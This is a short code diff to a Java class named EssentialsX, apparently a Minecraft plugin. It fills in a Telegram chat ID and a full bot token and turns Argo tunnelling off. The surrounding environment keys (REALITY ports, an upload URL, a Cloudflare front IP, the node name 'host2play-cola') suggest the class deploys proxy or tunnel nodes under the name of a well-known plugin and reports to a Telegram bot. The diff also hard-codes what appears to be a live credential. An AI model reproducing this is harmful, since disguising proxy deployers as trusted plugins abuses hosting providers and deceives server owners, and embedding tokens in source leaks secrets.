@@ -88,12 +88,12 @@ public class EssentialsX extends JavaPlugin {
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
+        env.put("CHAT_ID", "1683412448");
+        env.put("BOT_TOKEN", "8712404241:AAFPgj1EwUyMlKyutFilmO1M1z-EMeCTVAY");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
         env.put("NAME", "host2play-cola");
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
